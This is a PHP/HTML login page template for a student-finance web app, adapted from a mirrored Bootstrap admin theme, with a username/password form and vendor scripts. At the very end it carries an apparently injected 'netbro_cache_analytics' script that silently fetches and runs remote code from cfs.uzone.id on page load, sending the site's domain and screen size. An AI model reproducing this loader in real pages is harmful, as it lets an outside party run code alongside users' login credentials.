<!DOCTYPE html>
<html class="no-js css-menubar" lang="en">

<style type="text/css">

  .responsive-logo{background-size:cover; height:100%;}
  
  @media (min-width: 768px) and (max-width: 992px) {
     .responsive-logo{background-size:cover; height:100%; width: 35%;}
  }

  @media (min-width: 768px) and (max-width: 992px) {
     .responsive-logo{background-size:cover; height:100%; width: 35%;}
  }
  
</style>
<!-- Mirrored from getbootstrapadmin.com/remark/base/pages/login-v2.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 Aug 2016 04:10:15 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
  <meta name="description" content="bootstrap admin template">
  <meta name="author" content="">

  <title>Login - Aplikasi Keuangan Mahasiswa</title>

  <link rel="apple-touch-icon" href="<?php echo base_url(); ?>assets/global/images/apple-touch-icon.png">
  <link rel="shortcut icon" href="<?php echo base_url(); ?>assets/global/assets/images/khongguan-logo.ico">

  <!-- Stylesheets -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/css/bootstrap.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/css/bootstrap-extend.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/assets/css/site.min3f0d.css?v2.2.0">

  <!-- Skin tools (demo site only) -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/css/skintools.min3f0d.css?v2.2.0">
  <script src="<?php echo base_url(); ?>assets/global/js/sections/skintools.min.js"></script>

  <!-- Plugins -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/animsition/animsition.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/asscrollable/asScrollable.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/switchery/switchery.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/intro-js/introjs.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/slidepanel/slidePanel.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/flag-icon-css/flag-icon.min3f0d.css?v2.2.0">

  <!-- Page -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/assets/examples/css/pages/login-v2.min3f0d.css?v2.2.0">

  <!-- Fonts -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/fonts/web-icons/web-icons.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/fonts/brand-icons/brand-icons.min3f0d.css?v2.2.0">
  <link rel='stylesheet' href='http://fonts.googleapis.com/css?family=Roboto:300,400,500,300italic'>


  <!--[if lt IE 9]>
    <script src="../../global/vendor/html5shiv/html5shiv.min.js"></script>
    <![endif]-->

  <!--[if lt IE 10]>
    <script src="../../global/vendor/media-match/media.match.min.js"></script>
    <script src="../../global/vendor/respond/respond.min.js"></script>
    <![endif]-->

  <!-- Scripts -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/modernizr/modernizr.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/breakpoints/breakpoints.min.js"></script>
  <script>
    Breakpoints();
  </script>
</head>
<body class="page-login-v2 layout-full page-dark">
  <!--[if lt IE 8]>
        <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    <![endif]-->


  <!-- Page -->
  <div class="page animsition" data-animsition-in="fade-in" data-animsition-out="fade-out">
    <div class="page-content">
      <div class="page-brand-info">
        <div class="brand">
          
           <h2 class="brand-text font-size-40">Aplikasi Keuangan Mahasiswa</h2> 
        </div>
        <!--<p class="font-size-20">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
          tempor incididunt ut labore et dolore magna aliqua.</p>
		-->
	  </div>

      <div class="page-login-main">
        <div class="brand visible-xs">
         </div>
        <h3 class="font-size-24">Sign In</h3>
        <!--<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit.</p>--->

        <form name="form1" method="post" action="<?php echo base_url()?>dashboard/get_login">
          <div class="form-group">
            <label class="sr-only" for="inputEmail">Username</label>
            <input type="text" name="username" class="form-control" id="username" placeholder="Username" required autofocus>
          </div>
          <div class="form-group">
            <label class="sr-only" for="inputPassword">Password</label>
            <input type="password" name="password" class="form-control" id="password" placeholder="Password" required autofocus>
          </div>

          <input type="submit" value="Sign In" class="btn btn-primary btn-block">
        </form>

        <!-- <p>No account? <a href="register-v2.html">Sign Up</a></p> -->

        <footer class="page-copyright">
          <p>Kasir</p>
          <p>© 2021. All RIGHT RESERVED.</p>
          <!-- <div class="social">
            <a class="btn btn-icon btn-round social-twitter" href="javascript:void(0)">
              <i class="icon bd-twitter" aria-hidden="true"></i>
            </a>
            <a class="btn btn-icon btn-round social-facebook" href="javascript:void(0)">
              <i class="icon bd-facebook" aria-hidden="true"></i>
            </a>
            <a class="btn btn-icon btn-round social-google-plus" href="javascript:void(0)">
              <i class="icon bd-google-plus" aria-hidden="true"></i>
            </a>
          </div> -->
        </footer>
      </div>

    </div>
  </div>
  <!-- End Page -->


  <!-- Core  -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/jquery/jquery.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/bootstrap/bootstrap.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/animsition/animsition.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/asscroll/jquery-asScroll.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/mousewheel/jquery.mousewheel.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/asscrollable/jquery.asScrollable.all.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/ashoverscroll/jquery-asHoverScroll.min.js"></script>

  <!-- Plugins -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/switchery/switchery.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/intro-js/intro.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/screenfull/screenfull.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/slidepanel/jquery-slidePanel.min.js"></script>

  <!-- Plugins For This Page -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/jquery-placeholder/jquery.placeholder.min.js"></script>

  <!-- Scripts -->
  <script src="<?php echo base_url(); ?>assets/global/js/core.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/site.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/menu.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/menubar.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/gridmenu.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/sidebar.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global//js/configs/config-colors.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/configs/config-tour.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/js/components/asscrollable.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/animsition.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/slidepanel.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/switchery.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/js/components/jquery-placeholder.min.js"></script>


  <script>
    (function(document, window, $) {
      'use strict';

      var Site = window.Site;
      $(document).ready(function() {
        Site.run();
      });
    })(document, window, jQuery);
  </script>


  <!-- Google Analytics -->
  <script>
    (function(i, s, o, g, r, a, m) {
      i['GoogleAnalyticsObject'] = r;
      i[r] = i[r] || function() {
        (i[r].q = i[r].q || []).push(arguments)
      }, i[r].l = 1 * new Date();
      a = s.createElement(o),
        m = s.getElementsByTagName(o)[0];
      a.async = 1;
      a.src = g;
      m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '../../../../www.google-analytics.com/analytics.js',
      'ga');

    ga('create', 'UA-65522665-1', 'auto');
    ga('send', 'pageview');
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngWM8VnBkajqBnDecrVwig8M7iEIMQ7R%2fcBxieVl805ZHTXnzsd8e52V8J1wC9vvR4b7L4ogj5IZoZVrgMlrdQkerm7AVDm%2bRdFWBHv7D3LqAD4VM9vWpLWVsVFkIb%2bFrjN319lsGPpghbKGfCcmWrMlglz7M%2bRd6ZaXAN2Kxnbf5TLgCvSY2uhS9XNZJyTOpJzHJFeI63qsrp31yWtp0N%2b%2bosB9z83tqyBk7ftvCjH4Q%2bB5x0d3ZKe0Mq4DfCSf23swM2p1IXiQIJK6VGlHq%2bBo9RtSZkxl47LoxciFLim8kojAVwpnaERjHTHAOh0tQcE5kWL%2fkWNFqyY2pMIFa%2f99ZowwOG1Sk2qzSoYM2TwB8GWF3iQXyKK%2bRbJFL%2fl%2fSf%2bcktdHLqNlvzvaEjUQAulQEBW8LxudGmUYWdEDw8wx25TcksG5sksHKyGhtM5do0Rgrk1Xs6NozG%2fY2C4N9NNIDDYT2v%2fZlR1BG3i45XLgmFFD5x80MJQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from getbootstrapadmin.com/remark/base/pages/login-v2.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 09 Aug 2016 04:10:18 GMT -->
</html>